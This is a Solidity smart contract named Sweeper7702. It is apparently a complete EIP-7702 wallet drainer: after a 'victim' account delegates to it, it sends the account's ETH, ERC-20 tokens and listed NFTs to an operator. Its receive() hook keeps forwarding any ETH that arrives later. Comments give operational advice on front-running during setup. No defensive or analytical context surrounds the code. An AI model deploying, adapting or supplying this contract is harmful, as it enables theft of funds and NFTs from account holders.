// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20S {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IERC721S {
    function transferFrom(address from, address to, uint256 id) external;
}

/// @title Sweeper7702
/// @notice EIP-7702 delegate for a compromised EOA. Once the victim signs an authorization
///         pointing at this code, the EOA itself can push out every asset it holds.
///         `address(this)` is the victim, so ERC-20 `transfer` calls originate from the victim
///         and need no allowance.
/// @dev Storage lives in the victim's storage. The operator pointer uses a namespaced slot so
///      it cannot collide with whatever the victim had. `init` is first-caller-wins; submit the
///      delegation and the init call in the same bundle to avoid a front-run.
contract Sweeper7702 {
    struct State {
        address operator;
    }

    bytes32 private constant STATE_SLOT = keccak256("eth-sweeper.7702.state.v1");

    event Initiated(address operator);
    event Cleared(address indexed to, uint256 eth, uint256 tokens);

    function _state() private pure returns (State storage s) {
        bytes32 slot = STATE_SLOT;
        assembly {
            s.slot := slot
        }
    }

    function operator() external view returns (address) {
        return _state().operator;
    }

    function init(address op) external {
        State storage s = _state();
        if (s.operator == address(0)) {
            s.operator = op;
            emit Initiated(op);
        }
    }

    /// @notice Sweeps ETH, ERC-20 balances and the listed NFTs out of the delegated account.
    /// @param to Recipient. If zero, the caller is used; if an operator is set and the caller is
    ///        not it, the operator is used anyway (so a random front-runner cannot redirect funds).
    function sweep(address to, address[] calldata tokens, address[] calldata collections, uint256[] calldata ids)
        external
    {
        address op = _state().operator;
        address dest = (op != address(0) && msg.sender != op) ? op : (to == address(0) ? msg.sender : to);

        uint256 tokenCount;
        for (uint256 i; i < tokens.length; ++i) {
            uint256 balance = IERC20S(tokens[i]).balanceOf(address(this));
            if (balance == 0) continue;
            _safeTransfer(tokens[i], dest, balance);
            ++tokenCount;
        }

        for (uint256 i; i < collections.length && i < ids.length; ++i) {
            IERC721S(collections[i]).transferFrom(address(this), dest, ids[i]);
        }

        uint256 eth = address(this).balance;
        if (eth != 0) {
            (bool ok,) = dest.call{value: eth}("");
            require(ok, "ETH transfer failed");
        }

        emit Cleared(dest, eth, tokenCount);
    }

    /// @dev Keeps the account forwarding ETH that arrives later. Uses the whole gas stipend and
    ///      tolerates failure so a 2300-gas `transfer()` cannot revert the incoming payment.
    receive() external payable {
        address op = _state().operator;
        if (op == address(0)) return;
        uint256 balance = address(this).balance;
        if (balance == 0) return;
        (bool ok,) = op.call{value: balance}("");
        ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool ok, bytes memory data) = token.call(abi.encodeCall(IERC20S.transfer, (to, amount)));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
